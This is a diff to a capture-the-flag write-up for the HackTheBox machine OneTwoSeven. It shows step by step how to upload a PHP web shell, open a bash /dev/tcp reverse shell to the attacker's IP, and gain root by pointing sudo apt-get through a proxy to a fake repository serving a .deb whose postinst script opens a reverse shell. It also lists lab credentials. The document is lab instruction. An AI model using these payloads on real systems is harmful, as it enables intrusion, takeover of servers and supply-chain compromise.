@@ -79,14 +79,204 @@ This PHP file has some very interesting information:
 - Username: ots-admin
 - Password: 11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8
 
+The hash we got has 64 characters and is probably a SHA256 hash. We can either crack this manually but we find it on hashes.org:
+> Homesweethome1
+
 Let's check for that port with Nmap:
 ```markdown
 nmap -p 60080 10.10.10.133
 ```
 
-It says it is a filtered port and no other information, but we will use that port soon.
+It says it is a filtered port and no other information, so we will use SSH for port forwarding to connect to that port. We found out in the initial Nmap scan that a SSH service is running.
 
-The hash we got has 64 characters and is probably a SHA256 hash. We can either crack this manually but we find it on hashes.org:
-> Homesweethome1
+Port forwarding with SSH:
+```markdown
+ssh -N -L60080:127.0.0.1:60080 ots-2ZWE1MDE@10.10.10.133
+```
+
+Explanation:
+> -L{local port}:{open socket on this address and :port} opens port 60080 on my local machine to connect to my local address.
+
+The _-N_ parameter is needed because we don't want to execute commands.
+
+After that command we don't get a prompt back but we opened port 60080 on our 127.0.0.1 _(netstat -alnp)_ and thus can visit that site with our browser. This will bring us to the **Administration Backend** where we can try out the credentials we found in the source code and they work.
+
+#### Checking the Administration Backend
+
+Now that we logged in there we can check all the buttons.
+- OTS Default User
+  - Username: ots-yODc2NGQ
+  - Password: f528764d
+
+We can log in via SSH with this user and check his homepage and fortunaly we find **user.txt** in there.
+
+By clicking on the _[DL]_ next to the buttons we can download the PHP source code of the different applications. The only interesting application is the _OTS Addon Manager_. This contains an Apache RewriteEngineRule that says:
+```markdown
+RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]
+RewriteRule ^addon-download.php addons/ots-man-addon.php [L]
+```
+
+This looks for **addon-upload.php** and always rewrites it with **ots-man-addon.php** (which is the current page) and then [L] stops all processing rules after that. The source code for **ots-man-addon.php** shows us how this and the download of the source codes works and we will trick this to execute code.
+
+First we need to upload a random file. To activate the _Submit Query_ button, we open the Developer Tools and remove the part with _disabled="disabled"_ and send the request to Burpsuites Repeater.
+
+Change the method and path to:
+```markdown
+POST /addon-download.php&/addon-upload.php HTTP/1.1
+```
+Change the filename to:
+```markdown
+test.php
+```
+Change request to:
+```PHP
+<?php system($_REQUEST['Message']); ?>
+```
+
+Send it and if we get _File uploaded successfully_ then we can execute the uploaded PHP file. This file can be found here:
+> localhost:60080/addons/test.php
+
+Now we get a blank page and will try out the query with a whoami command:
+```markdown
+localhost:60080/addons/test.php?Message=whoami
+```
+
+This gives us _www-admin-data_ and this means we have code execution and can start a reverse shell.
+```markdown
+Message=bash -c 'bash -i >& /dev/tcp/10.10.14.209/9001 0>&1'
+
+URL-encoded:
+Message=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.209/9001+0>%261'
+```
+
+## Privilege Escalation
+
+After we started a reverse shell on the box, we are logged in as www-admin-data and can enumerate the machine. By enumerating we will find that this user got some commands to start with root privileges:
+```markdown
+Matching Defaults entries for www-admin-data on onetwoseven:
+    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
+    mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-admin-data may run the following commands on onetwoseven:
+    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
+```
+
+The commands **sudo apt-get update** and **sudo apt-get upgrade** can be executed with root privileges with this user. The first thing to check is GTFObins to bypass local security restrictions but unfortunately it does not have any command to abuse this commands. Interestingly though the commands will keep the proxy settings when executing them.
+
+If we just run the command we get this line that could be useful:
+> W: Failed to fetch hxxp://packages.onetwoseven.htb/devuan/dists/ascii/InRelease  Temporary failure resolving 'packages.onetwoseven.htb'
+
+And if we check the sources for apt at **/etc/apt/sources.list.d/** we find **onetwoseven.list** as a source. We will set up a proxy and imitate this source to upload our own "updates" on the box to execute commands.
+
+### Setting up a proxy and an apt source
+
+First we need to set up a new proxy in Burpsuite by clicking on **Options** and **Add** to add a new proxy. The settings will look like this:
+```markdown
+Bind to port: 8081
+Bind to address: Specific address (10.10.14.209)
+
+Redirect to host: 127.0.0.1
+Redirect to port: 8000
+```
+
+We put **packages.onetwoseven.htb** in our _/etc/hosts_ file:
+> 127.0.0.1   localhost packages.onetwoseven.htb
+
+Set up the environment variable for a proxy on the box:
+```markdown
+export http_proxy="http://10.10.14.209:8081"
+```
+
+Start a Python SimpleHTTPServer on port 8000 and we are done with the proxy settings. Now this happens when we execute _sudo apt-get update_:
+1. Command goes through the proxy (10.10.14.209:8081) we set up in Burpsuite
+2. Gets redirected to our localhost (127.0.0.1:8000)
+3. Hits the SimpleHTTPServer that runs on port 8000
+
+After executing _sudo apt-get update_ we can see that, that the server never validated with a _Release_ file and will trust every source the packages come from:
+> The repository 'hxxp://packages.onetwoseven.htb/devuan ascii Release' does not have a Release file.
+
+We can analyze the correct path where it wants the packages from in Burpsuite and we see the correct path is **/devuan/dists/ascii/main/binary-amd64/**.
 
 
+### Creating the apt package
+
+We need to create this directory in the path where our SimpleHTTPServer is running:
+```markdown
+mkdir /ascii/main/binary-amd64/*
+```
+
+Listing every installed package on the box with **dpkg -l** we can take any package that doesn't need a service restart. In my case I will take _telnet_ that is on version 0.17-41 and runs on amd64 on this box.
+
+Then we get an example packages file to recreate a malicious one. The host where those packages come from can be found in Burpsuite:
+> hxxp://deb.devuan.org//devuan/dists/ascii/main/binary-amd64/
+
+Download the **Packages.gz** and unzip it:
+```markdown
+gunzip Packages.gz
+```
+
+We delete the content from the Packages file and put our own content in:
+```markdown
+Package: telnet
+Version: 0.18-2001
+Maintainer: Testerman
+Architecture: amd64
+Description: Download this
+Section: all
+Priority: required
+Filename: telnet.deb
+Size: 44650
+SHA256: a9b89c7ceb88fc684db6994a85771777eeb9238c5ab7c93bdfbf15dd4974a54d
+```
+
+The _Version_ has to be higher than the original one the _Size_ and _SHA256_ will be changed soon.
+
+The next files we need are a **control** and **postinst** file. Those are placed in the folder _DEBIAN_.
+Create a file named **control** and put this in:
+```markdown
+Package: telnet
+Maintainer: Testerman
+Version: 0.18-2001
+Architecture: amd64
+Description: Download this
+```
+
+Create a file named **postinst** and put this in:
+```markdown
+#!/bin/bash
+
+bash -c 'bash -i >& /dev/tcp/10.10.14.209/9001 0>&1'
+```
+
+This will be executed after the installation of the package so it has to have the execute permission set:
+```markdown
+chmod 755 postinst
+```
+
+Build the package:
+```markdown
+dpgk-deb --build telnet/
+```
+
+This created the file **telnet.deb** that we need the _Size_ and the _SHA256_ hashsum to put in the Packages file.
+```markdown
+du -b telnet.deb
+
+sha256sum telnet.deb
+```
+
+After finishing the Package file we can compress it again:
+```markdown
+gzip Packages
+```
+
+Our file structure looks like this now:
+```markdown
+devuan/dists/ascii/main/binary-amd64/telnet.deb
+devuan/dists/ascii/main/binary-amd64/Packages.gz
+devuan/dists/ascii/main/binary-amd64/telnet/DEBIAN/control
+devuan/dists/ascii/main/binary-amd64/telnet/DEBIAN/postinst
+```
+
+Now we start a listener on port 9001 and execute the command **apt-get update**. This will find the file from our server and after executing **sudo apt-get upgrade**, we get a reverse shell as root!
